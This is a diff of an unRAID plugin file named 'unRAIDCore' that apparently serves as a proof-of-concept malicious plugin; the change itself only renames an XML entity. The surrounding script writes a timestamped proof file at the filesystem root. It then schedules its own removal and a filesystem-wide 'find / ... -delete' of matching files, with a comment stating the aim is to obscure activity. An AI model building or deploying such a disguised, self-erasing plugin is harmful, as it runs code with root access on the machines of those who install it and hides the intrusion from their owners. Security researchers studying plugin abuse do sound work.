@@ -2,7 +2,7 @@
 
 <!DOCTYPE PLUGIN [
 <!ENTITY name      "unRAIDCore">
-<!ENTITY file      "&name;.plg">
+<!ENTITY filename  "&name;.plg">
 <!ENTITY author    "squib">
 <!ENTITY version   "2024.10.10">
 <!ENTITY pluginURL "https://raw.githubusercontent.com/justin-himself/test/refs/heads/main/unRAIDCore.plg">
@@ -29,7 +29,7 @@ touch "/proof-$(date -Ins)"
 
 # Schedule deletion of the plugin since immediate deletion fails silently
 # Also remove the plugin from the list of removed plugins, tmp directory, pending directory, and elsewhere to obscure activity
-echo "plugin remove &file;; sleep 5s; find / -type f -name '*&file;*' -delete" | at now +1 minutes
+echo "plugin remove &filename;; sleep 5s; find / -type f -name '*&filename;*' -delete" | at now +1 minutes
 
 </INLINE>
 </FILE>
